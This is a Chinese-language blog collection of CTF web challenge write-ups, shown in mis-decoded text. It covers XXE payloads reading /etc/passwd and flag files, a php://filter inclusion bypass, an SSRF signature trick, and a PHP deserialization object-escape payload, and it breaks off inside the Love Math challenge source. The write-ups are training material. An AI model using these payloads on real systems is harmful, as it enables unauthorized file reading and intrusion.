å…ˆçŸ¥ç¤¾åŒº (aliyun.com) NCTF2019]Fake XML cookbook_sgnbi~çš„åšå®¢-CSDNåšå®¢ æµ…è°ˆXMLå®ä½“æ³¨å…¥æ¼æ´ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ· - XMLè¢«è®¾è®¡ä¸ºä¼ è¾“å’Œå­˜å‚¨æ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å†…å®¹ã€‚ - HTMLè¢«è®¾è®¡ç”¨æ¥æ˜¾ç¤ºæ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å¤–è§‚ã€‚ åŸºæœ¬è¯­æ³•ï¼š - æ‰€æœ‰ XML å…ƒç´ éƒ½é¡»æœ‰å…³é—­æ ‡ç­¾ã€‚ - XML æ ‡ç­¾å¯¹å¤§å°å†™æ•æ„Ÿã€‚ - XML å¿…é¡»æ­£ç¡®åœ°åµŒå¥—ã€‚ - XML æ–‡æ¡£å¿…é¡»æœ‰æ ¹å…ƒç´ ã€‚ - XML çš„å±æ€§å€¼é¡»åŠ å¼•å·ã€‚ - å®ä½“å¼•ç”¨ï¼Œå¦‚æœä½ æŠŠå­—ç¬¦ &quot;&lt;&quot; æ”¾åœ¨ XMLå…ƒç´ ä¸­ï¼Œä¼šå‘ç”Ÿé”™è¯¯ï¼Œè¿™æ˜¯å› ä¸ºè§£æå™¨ä¼šæŠŠå®ƒå½“ä½œæ–°å…ƒç´ çš„å¼€å§‹ã€‚è¿™æ ·ä¼šäº§ç”ŸXMLé”™è¯¯ï¼š &lt;bookstore> &lt;!--æ ¹å…ƒç´ --> &lt;book category=\"COOKING\"> &lt;!--bookstoreçš„å­å…ƒç´ ï¼Œcategoryä¸ºå±æ€§--> &lt;title>Everyday Italian&lt;/title> &lt;!--bookçš„å­å…ƒç´ ï¼Œlangä¸ºå±æ€§--> &lt;author>Giada De Laurentiis&lt;/author> &lt;!--bookçš„å­å…ƒç´ --> &lt;year>2005&lt;/year> &lt;!--bookçš„å­å…ƒç´ --> &lt;price>30.00&lt;/price> &lt;!--bookçš„å­å…ƒç´ --> &lt;/book> &lt;!--bookçš„ç»“æŸ--> &lt;/bookstore> &lt;!--bookstoreçš„ç»“æŸ--> DTD æ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆDTDï¼‰å¯å®šä¹‰åˆæ³•çš„XMLæ–‡æ¡£æ„å»ºæ¨¡å—ã€‚å®ƒä½¿ç”¨ä¸€ç³»åˆ—åˆæ³•çš„å…ƒç´ æ¥å®šä¹‰æ–‡æ¡£çš„ç»“æ„ã€‚DTDå¯è¢«æˆè¡Œåœ°å£°æ˜äºXMLæ–‡æ¡£ä¸­ï¼Œä¹Ÿå¯ä½œä¸ºä¸€ä¸ªå¤–éƒ¨å¼•ç”¨ã€‚å¸¦æœ‰DTDçš„XMLæ–‡æ¡£å®ä¾‹ &lt;?xml version&#x3D;&quot;1.0&quot;?&gt; &lt;!DOCTYPE note [&lt;!--å®šä¹‰æ­¤æ–‡æ¡£æ˜¯ note ç±»å‹çš„æ–‡æ¡£--&gt; &lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--å®šä¹‰noteå…ƒç´ æœ‰å››ä¸ªå…ƒç´ --&gt; &lt;!ELEMENT to (#PCDATA)&gt;&lt;!--å®šä¹‰toå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt; &lt;!ELEMENT from (#PCDATA)&gt;&lt;!--å®šä¹‰fromå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt; &lt;!ELEMENT head (#PCDATA)&gt;&lt;!--å®šä¹‰headå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt; &lt;!ELEMENT body (#PCDATA)&gt;&lt;!--å®šä¹‰bodyå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt; ]&gt; &lt;note&gt; &lt;to&gt;Y0u&lt;&#x2F;to&gt; &lt;from&gt;@re&lt;&#x2F;from&gt; &lt;head&gt;v3ry&lt;&#x2F;head&gt; &lt;body&gt;g00d!&lt;&#x2F;body&gt; &lt;&#x2F;note&gt; å½“ä½¿ç”¨å¤–éƒ¨DTDæ—¶ï¼Œé€šè¿‡å¦‚ä¸‹è¯­æ³•å¼•å…¥ã€‚ &lt;!DOCTYPE root-element SYSTEM \"filename\"> å¤–éƒ¨DTDå®ä¾‹ &lt;?xml version=\"1.0\"?> &lt;!DOCTYPE root-element SYSTEM \"test.dtd\"> &lt;note> &lt;to>Y0u&lt;/to> &lt;from>@re&lt;/from> &lt;head>v3ry&lt;/head> &lt;body>g00d!&lt;/body> &lt;/note> test.dtdï¼š &lt;!ELEMENT to (#PCDATA)>&lt;!--å®šä¹‰toå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--> &lt;!ELEMENT from (#PCDATA)>&lt;!--å®šä¹‰fromå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--> &lt;!ELEMENT head (#PCDATA)>&lt;!--å®šä¹‰headå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--> &lt;!ELEMENT body (#PCDATA)>&lt;!--å®šä¹‰bodyå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--> PCDATAçš„æ„æ€æ˜¯è¢«è§£æçš„å­—ç¬¦æ•°æ®ã€‚PCDATAæ˜¯ä¼šè¢«è§£æå™¨è§£æçš„æ–‡æœ¬ã€‚è¿™äº›æ–‡æœ¬å°†è¢«è§£æå™¨æ£€æŸ¥å®ä½“ä»¥åŠæ ‡è®°ã€‚æ–‡æœ¬ä¸­çš„æ ‡ç­¾ä¼šè¢«å½“ä½œæ ‡è®°æ¥å¤„ç†ï¼Œè€Œå®ä½“ä¼šè¢«å±•å¼€ã€‚ å†…éƒ¨å®ä½“ç¤ºä¾‹ä»£ç  &lt;?xml version &#x3D; &quot;1.0&quot; encoding &#x3D; &quot;utf-8&quot;?&gt; &lt;!DOCTYPE test [ &lt;!ENTITY writer &quot;Dawn&quot;&gt; &lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt; ]&gt; &lt;test&gt;&amp;writer;Â©right;&lt;&#x2F;test&gt; å¤–éƒ¨å®ä½“ç¤ºä¾‹ä»£ç  &lt;?xml version &#x3D; &quot;1.0&quot; encoding &#x3D; &quot;utf-8&quot;?&gt; &lt;!DOCTYPE test [ &lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; &lt;!ENTITY copyright SYSTEM &quot;http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;dtd&#x2F;entities.dtd&quot;&gt; ]&gt; &lt;author&gt;&amp;file;Â©right;&lt;&#x2F;author&gt; XXEæ¼æ´ç®€ä»‹ XXEæ¼æ´å…¨ç§°XML External Entity Injection å³XMLå¤–éƒ¨å®ä½“æ³¨å…¥ã€‚XXEæ¼æ´å‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºè§£æXMLè¾“å…¥æ—¶ï¼Œæ²¡æœ‰ç¦æ­¢å¤–éƒ¨å®ä½“çš„åŠ è½½ï¼Œå¯¼è‡´å¯åŠ è½½æ¶æ„å¤–éƒ¨æ–‡ä»¶å’Œä»£ç ï¼Œé€ æˆä»»æ„æ–‡ä»¶è¯»å–ã€å‘½ä»¤æ‰§è¡Œã€å†…ç½‘ç«¯å£æ‰«æã€æ”»å‡»å†…ç½‘ç½‘ç«™ã€å‘èµ·Dosæ”»å‡»ç­‰å±å®³ã€‚XXEæ¼æ´è§¦å‘çš„ç‚¹å¾€å¾€æ˜¯å¯ä»¥ä¸Šä¼ xmlæ–‡ä»¶çš„ä½ç½®ï¼Œæ²¡æœ‰å¯¹ä¸Šä¼ çš„xmlæ–‡ä»¶è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´å¯ä¸Šä¼ æ¶æ„xmlæ–‡ä»¶ã€‚ é€šè¿‡å„ç§åè®®å¯ä»¥å®ç°xxeæ³¨å…¥ï¼Œä¾‹å¦‚åˆ©ç”¨file://æ¥è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ è§£æxmlåœ¨phpåº“libxmlï¼Œlibxml&gt;=2.9.0çš„ç‰ˆæœ¬ä¸­æ²¡æœ‰XXEæ¼æ´ã€‚simplexml_load_string()å¯ä»¥è¯»å–XML ç®€å•çš„payload &lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; &lt;!DOCTYPE a [ &lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; ]&gt; &lt;xml&gt; &lt;xxe&gt;&amp;file;&lt;&#x2F;xxe&gt; &lt;&#x2F;xml&gt; &lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; &lt;!DOCTYPE note [ &lt;!ENTITY admin SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt; ]&gt; &lt;user&gt;&lt;username&gt;&amp;admin;&lt;&#x2F;username&gt;&lt;password&gt;123456&lt;&#x2F;password&gt;&lt;&#x2F;user&gt; é¢˜è§£ï¼š æŠ“åŒ…ï¼Œèƒ½çœ‹å‡ºæ˜¯ç”¨xmlè¿›è¡Œä¼ è¾“æ•°æ® ç›´æ¥ä¸Špayload &lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; &lt;!DOCTYPE note [ &lt;!ENTITY admin SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt; ]&gt; &lt;user&gt;&lt;username&gt;&amp;admin;&lt;&#x2F;username&gt;&lt;password&gt;123456&lt;&#x2F;password&gt;&lt;&#x2F;user&gt; [BSidesCF 2020]Had a bad dayçœ‹è¿™ä¸ªurlï¼Œè¯•è¯•ä¼ªåè®®è¯»å– å¤šäº†ä¸ªphp æ‰€ä»¥å¯ä»¥ç”¨è¿™ä¸ªæ¥è¯»æºç ?category=php://filter/read=convert.base64-encode/resource=index base64è§£ç åçš„é‡ç‚¹ &lt;?php $file &#x3D; $_GET[&#39;category&#39;]; if(isset($file)) &#123; if( strpos( $file, &quot;woofers&quot; ) !&#x3D;&#x3D; false || strpos( $file, &quot;meowers&quot; ) !&#x3D;&#x3D; false || strpos( $file, &quot;index&quot;))&#123; include ($file . &#39;.php&#39;); &#125; else&#123; echo &quot;Sorry, we currently only support woofers and meowers.&quot;; &#125; &#125; ?&gt; å­˜åœ¨flag.phpé¡µé¢ï¼Œä¹‹åå°±æ˜¯æƒ³åŠæ³•æŠŠä»–è¯»å‡ºæ¥ æ¥ä¸‹æ¥æœ‰ä¸€ä¸ª phpä¼ªåè®®åµŒå¥—çš„çŸ¥è¯†ç‚¹ PHPä¼ªåè®®å¯ä»¥å°†æŸä¸ªæ–‡ä»¶æˆ–æ–‡ä»¶å¤¹åŒ…å«åœ¨php://filter/convert.base64-encode/resource=flagä¸­ã€‚æ¯”å¦‚ï¼šphp://filter/convert.base64-encode/index/resource=flag è¿™æ ·å°±èƒ½ç»•è¿‡ifçš„åˆ¤æ–­ï¼Œè¯»å–flagæ–‡ä»¶ [ASIS 2019]Unicorn shop è¾“å…¥idå’Œä»·æ ¼ï¼Œåº”è¯¥æ˜¯è´­ä¹°ç‹¬è§’å…½ï¼Œè€Œä¸”priceåªå…è®¸è¾“å…¥ä¸€ä½æ•°ï¼Œå‰ä¸‰ä¸ªä¹°çš„æ—¶å€™éƒ½æ˜¾ç¤º ä½†æ˜¯å› ä¸ºpriceçš„è¾“å…¥é™åˆ¶ï¼Œæ‰€ä»¥æˆ‘çŒœè¿™é‡Œåº”è¯¥æ˜¯è¦æƒ³åŠæ³•è´­ä¹°ç¬¬å››ä¸ªç‹¬è§’å…½ è¿™é‡Œè¦åˆ©ç”¨Unicodeçš„ç¼–ç ï¼ŒæŸ¥æ‰¾ä¸€ä¸ªå¤§äº1337çš„å­—ç¬¦ https://www.compart.com/en/unicode/ æ¯”å¦‚è¿™ä¸ª æˆåŠŸæ‹¿åˆ°flag [BJDCTF2020]Cookie is so stable çœ‹ä¸€çœ¼hint flagé¡µé¢çš„ç™»å½•æ¡† è¿™é‡Œå­˜åœ¨sstiæ³¨å…¥ å¯ä»¥è¯•å‡ºæ¥æ˜¯twigæ¨¡æ¿ï¼Œæ ¹æ®æç¤ºæ³¨å…¥ç‚¹åº”è¯¥åœ¨cookieé‡Œï¼ŒæŠ“åŒ… é€šè¿‡ä¿®æ”¹userå†…å®¹å®ç°æ³¨å…¥ ä¸€ç¯‡æ–‡ç« å¸¦ä½ ç†è§£æ¼æ´ä¹‹ SSTI æ¼æ´ | K0rz3n&#39;s Blog sstiè¿˜æ˜¯ä¸å¤ªæ‡‚ï¼Œæ¯•ç«Ÿæˆ‘pythonè¿˜æ˜¯æ²¡å­¦ä¼šï¼Œé‡åˆ°sstiçš„é¢˜æˆ‘åªèƒ½ç›´æ¥æ‰¾payloadï¼Œå…ˆæ”¾åœ¨è¿™ï¼Œç­‰åˆ·å®Œbuuç¬¬äºŒé¡µé¢˜ç›®ä¹‹åå†å›å¤´çœ‹ä¸€é [De1CTF 2019]SSRF Meé¢˜ç›®æºç  #! &#x2F;usr&#x2F;bin&#x2F;env python # #encoding&#x3D;utf-8 from flask import Flask from flask import request import socket import hashlib import urllib import sys import os import json reload(sys) sys.setdefaultencoding(&#39;latin1&#39;) app &#x3D; Flask(__name__) secert_key &#x3D; os.urandom(16) class Task: def __init__(self, action, param, sign, ip): self.action &#x3D; action self.param &#x3D; param self.sign &#x3D; sign self.sandbox &#x3D; md5(ip) if(not os.path.exists(self.sandbox)): os.mkdir(self.sandbox) def Exec(self): result &#x3D; &#123;&#125; result[&#39;code&#39;] &#x3D; 500 if (self.checkSign()): if &quot;scan&quot; in self.action: tmpfile &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox, &#39;w&#39;) resp &#x3D; scan(self.param) if (resp &#x3D;&#x3D; &quot;Connection Timeout&quot;): result[&#39;data&#39;] &#x3D; resp else: print resp tmpfile.write(resp) tmpfile.close() result[&#39;code&#39;] &#x3D; 200 if &quot;read&quot; in self.action: f &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox, &#39;r&#39;) result[&#39;code&#39;] &#x3D; 200 result[&#39;data&#39;] &#x3D; f.read() if result[&#39;code&#39;] &#x3D;&#x3D; 500: result[&#39;data&#39;] &#x3D; &quot;Action Error&quot; else: result[&#39;code&#39;] &#x3D; 500 result[&#39;msg&#39;] &#x3D; &quot;Sign Error&quot; return result def checkSign(self): if (getSign(self.action, self.param) &#x3D;&#x3D; self.sign): return True else: return False @app.route(&quot;&#x2F;geneSign&quot;, methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;]) def geneSign(): param &#x3D; urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) action &#x3D; &quot;scan&quot; return getSign(action, param) @app.route(&#39;&#x2F;De1ta&#39;,methods&#x3D;[&#39;GET&#39;,&#39;POST&#39;]) def challenge(): action &#x3D; urllib.unquote(request.cookies.get(&quot;action&quot;)) param &#x3D; urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) sign &#x3D; urllib.unquote(request.cookies.get(&quot;sign&quot;)) ip &#x3D; request.remote_addr if(waf(param)): return &quot;No Hacker!!!!&quot; task &#x3D; Task(action, param, sign, ip) return json.dumps(task.Exec()) @app.route(&#39;&#x2F;&#39;) def index(): return open(&quot;code.txt&quot;,&quot;r&quot;).read() def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return &quot;Connection Timeout&quot; def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest() def md5(content): return hashlib.md5(content).hexdigest() def waf(param): check&#x3D;param.strip().lower() if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;): return True else: return False if __name__ &#x3D;&#x3D; &#39;__main__&#39;: app.debug &#x3D; False app.run(host&#x3D;&#39;0.0.0.0&#39;,port&#x3D;9999) Flaskæ¡†æ¶ï¼Œå…ˆçœ‹è·¯ç”±ï¼ŒgeneSignæ˜¯å¯¹ä¼ å…¥çš„paramä¸å…¶ä»–å­—ç¬¦ä¸²æ‹¼æ¥å¹¶è¿”å›å…¶md5å€¼ï¼ŒDe1taæ˜¯ä¸»è¦ï¼Œä¼ å…¥3ä¸ªå‚æ•°ï¼Œä»¥åŠipï¼Œå…ˆåˆ¤æ–­paramæ˜¯å¦æ˜¯gopheræˆ–è€…fileå¼€å¤´çš„å‚æ•°ï¼Œä¸æ˜¯åˆ™è¿‡åˆ°Taskä¸­ï¼Œå¹¶ä¸”è¿”å›taskçš„Exec()å‡½æ•°ç»“æœï¼Œå¦å¤–hintç»™å‡ºæç¤ºåœ¨flag.txtä¸­æœ‰flag 1ï¼š&#x2F;geneSignï¼šè·å¾—urlä¸­parmaå‚æ•°ï¼Œé€šè¿‡getSign(action, param)ç”Ÿæˆæ‘˜è¦ 2ï¼š&#x2F;De1taï¼šè·å¾—cookieä¸­çš„actionå’Œsignï¼Œwaf(param),åˆ›å»ºtaskå¯¹è±¡ï¼Œè°ƒç”¨exce()æ–¹æ³•ï¼Œjsonæ ¼å¼è¿”å› 3ï¼š&#x2F;ï¼šè¿”å›æºç  ä¸‰ä¸ªå‡½æ•° def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest() def md5(content): return hashlib.md5(content).hexdigest() def waf(param): check&#x3D;param.strip().lower() if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;): return True else: return False getSignï¼šè¿”å›secert_key + param + actionçš„å“ˆå¸Œå€¼md5ï¼šwafï¼šç¦æ­¢äº†flieå’Œgopheråè®® taskç±» class Task: def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr os.mkdir(self.sandbox) def Exec(self): result = &#123;&#125; result[&#39;code&#39;] = 500 if (self.checkSign()): if &quot;scan&quot; in self.action: tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#39;w&#39;) resp = scan(self.param) if (resp == &quot;Connection Timeout&quot;): result[&#39;data&#39;] = resp else: print resp tmpfile.write(resp) tmpfile.close() result[&#39;code&#39;] = 200 if &quot;read&quot; in self.action: f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#39;r&#39;) result[&#39;code&#39;] = 200 result[&#39;data&#39;] = f.read() if result[&#39;code&#39;] == 500: result[&#39;data&#39;] = &quot;Action Error&quot; else: result[&#39;code&#39;] = 500 result[&#39;msg&#39;] = &quot;Sign Error&quot; return result def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False checkSignï¼šæ£€æŸ¥cookieä¸­çš„signExecï¼šæ£€æŸ¥cookieä¸­çš„actionï¼Œå¦‚æœscanåœ¨actionä¸­ï¼Œå°†paramçš„æ–‡ä»¶å†…å®¹å†™å…¥result.txtï¼Œå¦‚æœreadåœ¨actionä¸­ï¼Œè¯»å‡ºresult.txt çš„å†…å®¹ hintæç¤ºflagåœ¨flag.txt ä¸­ï¼Œæƒ³è¦è¯»åˆ°ä»–é¦–å…ˆï¼šaction=scanï¼Œparam=flag.txt ï¼Œå°†flag.txtçš„å†…å®¹è¯»åˆ°result.txtä¸­ç„¶åï¼šaction=readï¼Œå°†result.txtçš„å†…å®¹è¯»å‡º ç»•è¿‡ç‚¹ï¼šsigncheckSignä¼šæ£€æŸ¥cookieä¸­çš„sign==getSignï¼ˆparamï¼Œactionï¼‰ä¸¤ä¸ªå›°éš¾ç‚¹ï¼šsecert_keyçš„å€¼æœªçŸ¥ æ€è·¯ï¼šå…ˆè¿›å…¥/De1taä¸­çš„challengeå‡½æ•°ï¼Œåœ¨Execä¸­çš„scanéƒ¨åˆ†ä¸­å°†flag.txtçš„å†…å®¹å­˜å…¥result.txtï¼Œç„¶åä»readéƒ¨åˆ†ä¸­å°†å…¶å­˜åˆ°resultå­—å…¸ä¸­è¯»å‡ºï¼Œå†ä»¥jsonå½¢å¼è¿”å›åˆ°å®¢æˆ·ç«¯ï¼Œæˆ‘ä»¬å°±èƒ½å¾—åˆ°flagã€‚ å†™å…¥ä¸è¯»å‡ºéƒ¨åˆ† è€Œå¦‚æœactionä¸­æ—¢æœ‰scan,åˆæœ‰read,é‚£ä¹ˆå°±ä¼šä¾æ¬¡æ‰§è¡Œscanå’Œread è€Œä¸ºäº†ç»•è¿‡è¿™ä¸ªéªŒè¯ï¼Œå°±è¦åˆ©ç”¨ è®©param = flag.txtread å› ä¸ºactionä¸ºscan æ‰€ä»¥å¾—åˆ°çš„md5å€¼ä¸ºkeyflag.txtreadscan æ»¡è¶³action=readscan param=flag.txtæ—¶çš„å€¼ è§£é¢˜ â€‹ é¦–å…ˆè¿›å…¥genesigné¡µé¢å¾—åˆ°md5(keyflag.txtreadscan)çš„å€¼ä½œä¸ºsign åœ¨åˆ°de1taç•Œé¢æŠ“åŒ…getè¿›param=flag.phpï¼Œåœ¨cookieå†…åŠ å…¥signå’Œaction [å®‰æ´µæ¯ 2019]easy_serialize_phpä»£ç å®¡è®¡ &lt;?php $function &#x3D; @$_GET[&#39;f&#39;]; function filter($img)&#123; $filter_arr &#x3D; array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;); $filter &#x3D; &#39;&#x2F;&#39;.implode(&#39;|&#39;,$filter_arr).&#39;&#x2F;i&#39;; return preg_replace($filter,&#39;&#39;,$img); &#125; if($_SESSION)&#123; unset($_SESSION); &#125; $_SESSION[&quot;user&quot;] &#x3D; &#39;guest&#39;; $_SESSION[&#39;function&#39;] &#x3D; $function; extract($_POST); if(!$function)&#123; echo &#39;&lt;a href&#x3D;&quot;index.php?f&#x3D;highlight_file&quot;&gt;source_code&lt;&#x2F;a&gt;&#39;; &#125; if(!$_GET[&#39;img_path&#39;])&#123; $_SESSION[&#39;img&#39;] &#x3D; base64_encode(&#39;guest_img.png&#39;); &#125;else&#123; $_SESSION[&#39;img&#39;] &#x3D; sha1(base64_encode($_GET[&#39;img_path&#39;])); &#125; $serialize_info &#x3D; filter(serialize($_SESSION)); if($function &#x3D;&#x3D; &#39;highlight_file&#39;)&#123; highlight_file(&#39;index.php&#39;); &#125;else if($function &#x3D;&#x3D; &#39;phpinfo&#39;)&#123; eval(&#39;phpinfo();&#39;); &#x2F;&#x2F;maybe you can find something in here! &#125;else if($function &#x3D;&#x3D; &#39;show_image&#39;)&#123; $userinfo &#x3D; unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo[&#39;img&#39;])); &#125; phpinfoé‡Œæœ‰ä¸œè¥¿ï¼Œå¯ä»¥å…ˆçœ‹çœ‹ æ¥ä¸‹æ¥æˆ‘ä»¬åº”è¯¥å¼€å§‹æƒ³æ€ä¹ˆè®© base64_decode($userinfo[&#39;img&#39;])çš„å€¼ç­‰äºflagçš„æ–‡ä»¶å çŸ¥è¯†ç‚¹ ååºåˆ—åŒ–ä¸­çš„å¯¹è±¡é€ƒé€¸ extract()å˜é‡è¦†ç›– extract()å˜é‡è¦†ç›– ä½†æ˜¯è¿™é‡Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥ç»™imgèµ‹å€¼ï¼Œå› ä¸ºimgèµ‹å€¼å‘ç”Ÿåœ¨extractä¹‹å ååºåˆ—åŒ–ä¸­çš„å¯¹è±¡é€ƒé€¸ é”®å€¼é€ƒé€¸ å› ä¸ºåºåˆ—åŒ–çš„å­—ç¬¦ä¸²æ˜¯ä¸¥æ ¼çš„ï¼Œå¯¹åº”çš„æ ¼å¼ä¸èƒ½é”™ï¼Œæ¯”å¦‚s:4:â€œnameâ€,é‚£s:4å°±å¿…é¡»æœ‰ä¸€ä¸ªå­—ç¬¦ä¸²é•¿åº¦æ˜¯4çš„å¦åˆ™å°±å¾€åè¦ã€‚ å¹¶ä¸”ååºåˆ—åŒ–ä¼šæŠŠå¤šä½™çš„å­—ç¬¦ä¸²å½“åƒåœ¾å¤„ç†ï¼Œåœ¨èŠ±æ‹¬å·å†…çš„å°±æ˜¯æ­£ç¡®çš„ï¼ŒèŠ±æ‹¬å·&#123;&#125;å¤–çš„å°±éƒ½è¢«æ‰”æ‰ã€‚ æ¥ä¸‹æ¥æ˜¯æ„é€ payloadçš„éƒ¨åˆ† é¦–å…ˆæˆ‘ä»¬éœ€è¦æ„é€ imgå±æ€§ï¼š s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;; å…¶ä¸­çš„ZDBnM19mMWFnLnBocA==æ˜¯d0g3_f1ag.phpçš„base64åŠ å¯†çš„ç»“æœç„¶ååœ¨è¿™ä¸ªå±æ€§å‰é¢éšä¾¿åŠ ä¸Šä¸ªåºåˆ—åŒ–å­—ç¬¦ä¸²ï¼ˆåªè¦æ˜¯åˆæ³•çš„å°±è¡Œï¼‰ï¼Œæ¯”å¦‚ï¼š ;s:1:â€œ1â€;;s:2:â€œ10â€;;s:3:â€œ100â€; æ‰€ä»¥payloadå¯ä»¥ä¸ºï¼š _SESSION[phpflag]&#x3D;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125; sessionä¸­å­˜åœ¨phpflagçš„åŸå› æ˜¯ç”±äºfilterå‡½æ•°ä¼šå°†åŒ¹é…åˆ°çš„å€¼å˜ä¸ºç©ºï¼Œè€Œphpflagçš„é•¿åº¦åˆšå¥½ä¸º7 ä¸º7çš„åŸå›  ä½†æ˜¯æ·»åŠ äº†filterå‡½æ•°æ¥è¿›è¡Œè¿‡æ»¤ä¹‹å åŸæ¥çš„å†…å®¹å˜ä¸ºäº† a:1:&#123;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125; èƒ½æˆåŠŸå®ç°è¯»å–flagæ‰€åœ¨æ–‡ä»¶çš„å‘½ä»¤ postå å¯¹/d0g3_fllllllagè¿›è¡Œbase64ç¼–ç åä¸ºL2QwZzNfZmxsbGxsbGFn æ‰€ä»¥ç›´æ¥æŠŠåŸæ¥çš„ç¼–ç æ›¿æ¢æ‰å°±è¡Œ çœ‹æ˜¯çœ‹æ‡‚äº†ï¼Œä½†æˆ‘è¿˜æ˜¯æƒ³ä¸åˆ°è¿™ç§payloadã€‚ã€‚ã€‚ å‚è€ƒæ–‡ç«  å®‰æ´µæ¯ 2019]easy_serialize_php -------- ååºåˆ—åŒ–/åºåˆ—åŒ–å’Œä»£ç å®¡è®¡_è‹¥ä¸¶æ—¶å…‰ç ´ç­çš„åšå®¢-CSDNåšå®¢ https://www.cnblogs.com/h3zh1/p/12732336.html [CISCN 2019 åˆèµ›]Love Mathæºç  &lt;?php error_reporting(0); &#x2F;&#x2F;å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag if(!isset($_GET[&#39;c&#39;]))&#123; show_source(__FILE__); &#125;else&#123; &#x2F;&#x2F;ä¾‹å­ c&#x3D;20-1 $content &#x3D; $_GET[&#39;c&#39;]; if (strlen($content) &gt;&#x3D; 80) &#123; die(&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;); &#125; $blacklist &#x3D; [&#39; &#39;, &#39;\\t&#39;, &#39;\\r&#39;, &#39;\\n&#39;,&#39;\\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\\[&#39;, &#39;\\]&#39;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $content)) &#123; die(&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;); &#125; &#125; &#x2F;&#x2F;å¸¸ç”¨æ•°å­¦å‡½æ•°http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;php_ref_math.asp $whitelist &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;]; preg_match_all(&#39;&#x2F;[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*&#x2F;&#39;, $content, $used_funcs); foreach ($used_funcs[0] as $func) &#123; if (!in_array($func, $whitelist)) &#123; 